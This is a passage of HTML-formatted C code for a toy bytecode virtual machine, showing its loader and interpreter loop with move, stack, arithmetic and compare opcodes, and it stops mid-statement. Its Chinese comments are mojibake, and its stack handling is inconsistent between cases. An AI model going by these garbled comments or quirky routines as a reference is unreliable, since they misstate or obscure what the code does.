operator\">-></span>reg<span class=\"token punctuation\">[</span>R1<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R3<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R4<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">// åŠ è½½ä¸€æ®µç¨‹åºåˆ°è™šæ‹Ÿæœºçš„å†…å­˜ä¸­ï¼Œå¹¶è¿”å›åŠ è½½åçš„ç¨‹åºé•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> prog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// åˆå§‹åŒ–ç¨‹åºé•¿åº¦ä¸º 0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>prog <span class=\"token operator\">!=</span> HLT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              <span class=\"token comment\">// å¾ªç¯è¯»å–ç¨‹åºå­—èŠ‚ï¼Œç›´åˆ°é‡åˆ° HLT æŒ‡ä»¤</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">;</span> <span class=\"token comment\">// å°†å½“å‰å­—èŠ‚å†™å…¥è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œç›¸å¯¹äºç¨‹åºè®¡æ•°å™¨çš„åç§»åœ°å€</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        prog<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// æŒ‡å‘ä¸‹ä¸€ä¸ªå­—èŠ‚</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        len<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// ç¨‹åºé•¿åº¦åŠ  1</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>     vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> HLT<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// å°† HLT æŒ‡ä»¤å†™å…¥è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œä½œä¸ºç¨‹åºçš„ç»“æŸæ ‡å¿—</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">return</span> len<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// è¿”å›ç¨‹åºé•¿åº¦ï¼ˆåŒ…å« HLT æŒ‡ä»¤ï¼‰</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\">// å®šä¹‰ä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ä½œä¸ºå‚æ•°</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> src<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>running<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// å¾ªç¯æ‰§è¡Œï¼Œç›´åˆ°è¿è¡ŒçŠ¶æ€ä¸º 0</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token class-name\">uint8_t</span> op <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ä»å†…å­˜ä¸­è¯»å–å½“å‰æŒ‡ä»¤</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>op<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// æ ¹æ®æŒ‡ä»¤ç±»å‹è¿›è¡Œåˆ†æ”¯å¤„ç†</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">case</span> MOV<span class=\"token operator\">:</span> <span class=\"token comment\">// ç§»åŠ¨æ•°æ® </span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span>dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// å°†æºå¯„å­˜å™¨çš„å€¼èµ‹ç»™ç›®æ ‡å¯„å­˜å™¨</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> src<span class=\"token punctuation\">;</span> <span class=\"token comment\">// å°†ç›®æ ‡å€¼èµ‹ç»™ç›®æ ‡å¯„å­˜å™¨</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// å°†ç¨‹åºè®¡æ•°å™¨å¢åŠ  4ï¼ˆè·³è¿‡æŒ‡ä»¤å’Œæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">case</span> PUSH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">--</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">case</span> POP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> ALU<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åŠ æ³•</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å‡æ³•</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// ä¹˜æ³•</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å¼‚æˆ–</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> CMP<span class=\"token operator\">:</span><span class=\"token comment\">// æ¯”è¾ƒçš„æ˜¯åé¢ 2 ä¸ªæ“ä½œæ•°ä»£è¡¨çš„å¯„å­˜å™¨çš„å€¼</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>            vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> 